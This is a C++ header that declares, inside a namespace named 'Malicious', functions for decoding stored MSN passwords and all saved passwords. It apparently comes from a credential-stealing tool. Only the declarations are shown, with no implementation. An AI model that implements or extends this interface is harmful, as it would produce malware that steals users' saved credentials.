#ifndef _PASSWORDS_HPP_
#define _PASSWORDS_HPP_

#include <string>
#include <exception>

namespace Malicious
{
    class ErrorWhileRetrieving : public std::exception {};
	std::string decodeMsnPasswords(char delimiter);
    std::string decodeAllPasswords(char delimiter);

} // Malicious

#endif // _PASSWORDS_HPP_
